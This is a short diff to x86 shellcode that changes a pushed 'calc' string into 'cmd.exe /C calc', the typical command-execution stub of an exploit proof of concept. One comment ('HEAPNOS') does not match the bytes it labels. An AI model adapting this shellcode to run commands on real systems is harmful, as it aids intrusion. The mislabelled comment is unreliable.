@@ -70,7 +70,10 @@ push eax
 pop esi
 xor ecx,ecx
 push ecx
-push 0x636c6163 ; clac
+push 0x636c6163 ; HEAPNOS
+push 0x20432f20 ; C/
+push 0x20657865 ; exe
+push 0x2e646d63 ;.dmc
 mov ecx,esp
 xor ebx,ebx
 mov ebx, 0xffffffff
